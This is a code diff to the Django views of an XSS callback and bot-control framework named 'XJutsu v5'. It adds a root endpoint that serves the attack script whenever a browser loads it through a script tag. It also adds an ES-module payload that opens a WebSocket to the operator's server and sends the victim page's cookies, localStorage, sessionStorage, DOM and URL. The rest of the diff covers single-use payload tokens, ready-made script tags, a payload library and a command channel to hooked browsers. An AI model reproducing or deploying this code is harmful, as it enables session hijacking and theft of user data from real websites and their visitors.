@@ -9,7 +9,7 @@ from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth import login, authenticate
 from django.contrib import messages
-from django.http import JsonResponse, HttpResponse
+from django.http import JsonResponse, HttpResponse, HttpResponseForbidden
 from django.views.decorators.csrf import csrf_exempt
 from django.views.decorators.http import require_http_methods
 from django.utils import timezone
@@ -17,10 +17,43 @@ from django.conf import settings
 from django.db.models import Count
 from django.db.models.functions import TruncDate
 
-from .models import Capture, Payload, CollectedPage, WebhookConfig, APIKey
+from .models import Capture, Payload, CollectedPage, WebhookConfig, APIKey, PayloadToken, PayloadLibrary
 from .obfuscator import PayloadObfuscator
 from .commands import BotCommander
 from .geoip import GeoIPService
+from .tokens import TokenService, RateLimiter
+
+
+# ============== Smart Root Endpoint ==============
+
+@csrf_exempt
+def smart_root(request):
+    """
+    Smart root endpoint - serves JS when loaded as script, otherwise redirects to dashboard
+    This enables shortest payload: <script src=//6u.gg></script>
+    """
+    # Check if this is a script request (loaded via <script src>)
+    accept_header = request.META.get('HTTP_ACCEPT', '')
+    sec_fetch_dest = request.META.get('HTTP_SEC_FETCH_DEST', '')
+
+    # Detect script loading:
+    # 1. Sec-Fetch-Dest: script (modern browsers)
+    # 2. Accept contains */*, no text/html (older browsers)
+    # 3. No Accept header at all (some script requests)
+    is_script_request = (
+        sec_fetch_dest == 'script' or
+        (accept_header and 'text/html' not in accept_header and '*/*' in accept_header) or
+        (not accept_header) or
+        request.GET.get('js') == '1'  # Force JS via ?js=1
+    )
+
+    if is_script_request:
+        return serve_payload_js(request)
+
+    # Otherwise redirect to dashboard (requires login)
+    if request.user.is_authenticated:
+        return redirect('dashboard')
+    return redirect('login')
 
 
 # ============== Dashboard Views ==============
@@ -286,6 +319,7 @@ def api_key_create(request):
 def serve_payload_js(request, payload_id=None):
     """
     Serve the XSS payload JavaScript
+    Supports optional token validation for single-use payloads
     """
     # Handle CORS preflight
     if request.method == 'OPTIONS':
@@ -294,19 +328,132 @@ def serve_payload_js(request, payload_id=None):
         response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
         response['Access-Control-Allow-Headers'] = '*'
         return response
-    
-    server_url = f"{request.scheme}://{request.get_host()}"
+
+    # Get client IP for rate limiting
+    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+    if x_forwarded_for:
+        client_ip = x_forwarded_for.split(',')[0].strip()
+    else:
+        client_ip = request.META.get('REMOTE_ADDR')
+
+    # Rate limiting (10 requests per minute per IP)
+    rate_key = RateLimiter.get_client_key(request, 'payload')
+    is_allowed, remaining, reset_time = RateLimiter.check_rate_limit(rate_key, max_requests=60, window_seconds=60)
+
+    if not is_allowed:
+        response = HttpResponse('// Rate limited', content_type='application/javascript', status=429)
+        response['Retry-After'] = str(int(reset_time - timezone.now().timestamp()))
+        return response
+
+    # Check for token-based validation (optional)
+    token = request.GET.get('t') or request.GET.get('token')
+    if token:
+        # Try HMAC token first
+        is_valid, token_payload_id, error = TokenService.verify_token(token)
+        if is_valid:
+            payload_id = token_payload_id or payload_id
+        else:
+            # Try database token
+            try:
+                db_token = PayloadToken.objects.get(token=token)
+                if db_token.is_valid:
+                    payload_id = str(db_token.payload_id) if db_token.payload else payload_id
+                    db_token.mark_used(client_ip)
+                else:
+                    response = HttpResponse('// Token expired or used', content_type='application/javascript', status=403)
+                    response['Access-Control-Allow-Origin'] = '*'
+                    return response
+            except PayloadToken.DoesNotExist:
+                # Invalid token - still serve default payload for flexibility
+                pass
+
+    # Get short domain from settings or request host
+    short_domain = getattr(settings, 'SHORT_DOMAIN', None) or request.get_host()
+    server_url = f"{request.scheme}://{short_domain}"
     ws_protocol = 'wss' if request.is_secure() else 'ws'
-    ws_url = f"{ws_protocol}://{request.get_host()}/ws/callback/"
-    
+    ws_url = f"{ws_protocol}://{short_domain}/ws/callback/"
+
     # Generate the payload JavaScript
     js_content = generate_payload_js(server_url, ws_url, payload_id)
-    
-    response = HttpResponse(js_content, content_type='application/javascript')
+
+    response = HttpResponse(js_content, content_type='application/javascript; charset=utf-8')
     response['Access-Control-Allow-Origin'] = '*'
+    response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
+    response['Access-Control-Allow-Headers'] = '*'
     response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
-    
+    response['X-Content-Type-Options'] = 'nosniff'
+
     return response
+
+
+@csrf_exempt
+@require_http_methods(["GET", "OPTIONS"])
+def serve_module_js(request, module_name=None):
+    """
+    Serve JavaScript as ES module (requires CORS for import())
+    Endpoint: /m/<module>.js or /module/<module>.js
+    """
+    if request.method == 'OPTIONS':
+        response = HttpResponse()
+        response['Access-Control-Allow-Origin'] = '*'
+        response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
+        response['Access-Control-Allow-Headers'] = '*'
+        return response
+
+    short_domain = getattr(settings, 'SHORT_DOMAIN', None) or request.get_host()
+    server_url = f"{request.scheme}://{short_domain}"
+    ws_protocol = 'wss' if request.is_secure() else 'ws'
+    ws_url = f"{ws_protocol}://{short_domain}/ws/callback/"
+
+    # ES Module format
+    js_content = generate_module_js(server_url, ws_url)
+
+    response = HttpResponse(js_content, content_type='application/javascript; charset=utf-8')
+    response['Access-Control-Allow-Origin'] = '*'
+    response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
+    response['Access-Control-Allow-Headers'] = '*'
+    response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
+    response['X-Content-Type-Options'] = 'nosniff'
+
+    return response
+
+
+def generate_module_js(server_url, ws_url):
+    """
+    Generate ES Module version of payload (for import() calls)
+    """
+    return f'''// XJutsu v5 - ES Module Payload
+const config = {{
+    serverUrl: "{server_url}",
+    wsUrl: "{ws_url}",
+    botId: Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2)
+}};
+
+const connect = () => {{
+    const ws = new WebSocket(config.wsUrl);
+    ws.onopen = () => {{
+        ws.send(JSON.stringify({{ type: 'register', bot_id: config.botId }}));
+        ws.send(JSON.stringify({{
+            type: 'callback',
+            payload: {{
+                bot_id: config.botId,
+                uri: location.href,
+                origin: location.origin,
+                referrer: document.referrer,
+                cookies: document.cookie,
+                localstorage: Object.fromEntries(Object.keys(localStorage).map(k => [k, localStorage[k]])),
+                sessionstorage: Object.fromEntries(Object.keys(sessionStorage).map(k => [k, sessionStorage[k]])),
+                dom: document.documentElement.outerHTML.slice(0, 50000),
+                user_agent: navigator.userAgent,
+                browser_info: {{ platform: navigator.platform, language: navigator.language }}
+            }}
+        }}));
+    }};
+}};
+
+connect();
+export default config;
+'''
 
 
 def generate_payload_js(server_url, ws_url, payload_id=None):
@@ -644,16 +791,83 @@ def send_bot_command(request):
         bot_id = data.get('bot_id')
         command = data.get('command')
         args = data.get('args', {})
-        
+
         if not bot_id or not command:
             return JsonResponse({'error': 'bot_id and command required'}, status=400)
-        
+
         success = BotCommander.send_command(bot_id, command, args)
-        
+
         return JsonResponse({
             'status': 'success' if success else 'error',
             'message': f"Command '{command}' sent to {bot_id}" if success else 'Failed to send command'
         })
-        
+
     except Exception as e:
         return JsonResponse({'error': str(e)}, status=500)
+
+
+# ============== Payload Library ==============
+
+@login_required
+def payload_library(request):
+    """
+    Display payload library organized by category
+    """
+    from django.db.models import Count
+
+    # Get payloads grouped by category
+    categories = PayloadLibrary.CATEGORY_CHOICES
+    library = {}
+
+    for cat_key, cat_name in categories:
+        payloads = PayloadLibrary.objects.filter(category=cat_key, is_active=True)
+        if payloads.exists():
+            library[cat_key] = {
+                'name': cat_name,
+                'payloads': payloads
+            }
+
+    # Get short domain for template placeholders
+    short_domain = getattr(settings, 'SHORT_DOMAIN', request.get_host())
+
+    context = {
+        'library': library,
+        'short_domain': short_domain,
+        'total_payloads': PayloadLibrary.objects.filter(is_active=True).count(),
+    }
+
+    return render(request, 'hunter/payload_library.html', context)
+
+
+@login_required
+def generate_token(request):
+    """
+    Generate a new payload token (AJAX endpoint)
+    """
+    if request.method == 'POST':
+        data = json.loads(request.body)
+        payload_id = data.get('payload_id')
+        expires_minutes = data.get('expires_minutes', 60)
+        max_uses = data.get('max_uses', 1)
+
+        # Generate HMAC token
+        token = TokenService.generate_token(payload_id, expires_minutes)
+
+        # Also store in DB for tracking
+        db_token = PayloadToken.objects.create(
+            payload_id=payload_id if payload_id else None,
+            token=token,
+            max_uses=max_uses,
+            expires_at=timezone.now() + timezone.timedelta(minutes=expires_minutes)
+        )
+
+        short_domain = getattr(settings, 'SHORT_DOMAIN', request.get_host())
+
+        return JsonResponse({
+            'token': token,
+            'payload_url': f"//{short_domain}?t={token}",
+            'script_tag': f'<script src=//{short_domain}?t={token}></script>',
+            'expires_at': db_token.expires_at.isoformat(),
+        })
+
+    return JsonResponse({'error': 'POST required'}, status=400)
